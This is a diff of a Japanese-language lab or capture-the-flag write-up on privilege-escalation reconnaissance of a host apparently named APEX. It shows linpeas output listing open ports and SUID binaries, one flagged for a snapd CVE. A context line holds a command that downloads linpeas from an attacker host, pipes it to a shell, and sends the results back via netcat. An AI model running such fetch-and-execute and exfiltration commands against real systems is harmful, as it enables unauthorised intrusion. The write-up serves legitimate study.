@@ -53,7 +53,7 @@ curl 192.168.45.182:8888/linpeas.sh | sh | nc -q 0 192.168.45.182 9002
 ```powershell
 # ポート22（おそらくSSH）が動作
 ╔══════════╣ Active Ports
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                    
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                  
 ══╣ Active Ports (netstat)                                                    
 tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN    
 
@@ -79,18 +79,12 @@ ibase.allow_persistent = 1
 mysqli.allow_persistent = On
 pgsql.allow_persistent = On
 
-# sshでログインできる？
-══╣ Possible private SSH keys were found!
-/etc/ImageMagick-6/mime.xml
-/var/www/openemr/vendor/phpseclib/phpseclib/phpseclib/Crypt/RSA.php
-
 # SUID系は特になさそう
-══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                                                                                                                                                          
-                      ╚════════════════════════════════════╝                                                                                                                                                                                                                                                                
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                               ╚════════════════════════════════════╝                     
 ╔══════════╣ SUID - Check easy privesc, exploits and write perms
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                
 strings Not Found                                                                 
--rwsr-xr-x 1 root root 99K Nov 22  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic                                                                                                                                                                                                                                          
+-rwsr-xr-x 1 root root 99K Nov 22  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic                                 
 -rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
 -rwsr-xr-x 1 root root 111K Feb  2  2021 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
 -rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
@@ -128,6 +122,14 @@ strings Not Found
 
 ## システム情報
 
+```sh
+www-data@APEX:/$ hostnamectl
+   Static hostname: APEX
+...
+  Operating System: Ubuntu 18.04.5 LTS
+            Kernel: Linux 4.15.0-143-generic
+      Architecture: x86-64
+```
 
 ---
 
